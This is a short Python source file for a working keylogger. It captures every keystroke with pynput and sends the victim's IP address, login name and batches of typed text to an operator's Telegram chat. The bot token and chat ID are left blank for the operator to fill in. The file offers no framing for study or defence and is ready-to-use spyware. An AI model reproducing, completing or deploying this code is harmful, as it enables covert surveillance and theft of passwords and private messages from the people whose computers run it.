import os
import socket
import time

import telebot
from pynput import keyboard


class Data():
    def __init__(self):
        self.token = ''  #Telegram bot api token
        self.chatID = '' #Chat id in which bot will send messages(you need to add bot in this chat) to get chat id use @cid_bot

global mainstr, timeLaps

mainstr = ' '

timeLaps = time.time()

data = Data()

def send(message):
    global data 

    bot = telebot.TeleBot(data.token)
    bot.send_message(data.chatID, f'{os.getlogin()}:{message}')

send(f'Подключен {socket.gethostbyname(socket.gethostname())}\nИмя пользователя {os.getlogin()}')

def on_press(key):
    global mainstr, timeLaps

    if type(key) != type(keyboard.Key.alt):
        if key.char != None:
            mainstr += key.char
    
    elif key == keyboard.Key.space:
        mainstr += ' '
    
    elif key == keyboard.Key.backspace and len(mainstr) > 1:
        mainstr = mainstr[:-1]
    
    if len(mainstr) >= 300 or time.time() - timeLaps >= 1200:
        timeLaps = time.time()
        send(mainstr)
        mainstr = ' '

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
